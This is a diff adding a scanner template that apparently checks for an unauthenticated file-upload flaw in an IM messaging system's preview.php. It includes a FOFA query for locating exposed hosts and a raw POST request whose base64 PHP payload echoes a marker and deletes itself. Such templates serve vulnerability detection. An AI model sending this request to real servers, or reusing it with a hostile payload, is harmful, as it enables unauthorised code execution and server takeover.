@@ -1,0 +1,30 @@
+id: im-system-preview-file-upload
+
+info:
+  name: "IM即时通讯系统 preview.php 文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="/superloginAction.html" || "im.smiaoshen.com"
+        IM 即时通讯系统中的 preview.php 接口存在文件上传漏洞，攻击者无需身份验证即可通过该接口上传恶意文件，导致远程代码执行，进而获取服务器控制权限，威胁整个Web服务器的安全。
+  tags: IM即时通讯系统
+
+http:
+- raw:
+  - |
+    POST /static/lib/webuploader/0.1.5/server/preview.php HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Connection: close
+    Content-Type: application/x-www-form-urlencoded
+
+    data:image/php;base64,PD9waHAgZWNobyAnTmRheVRlc3QnOyB1bmxpbmsoX19GSUxFX18pOyA/Pg==
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
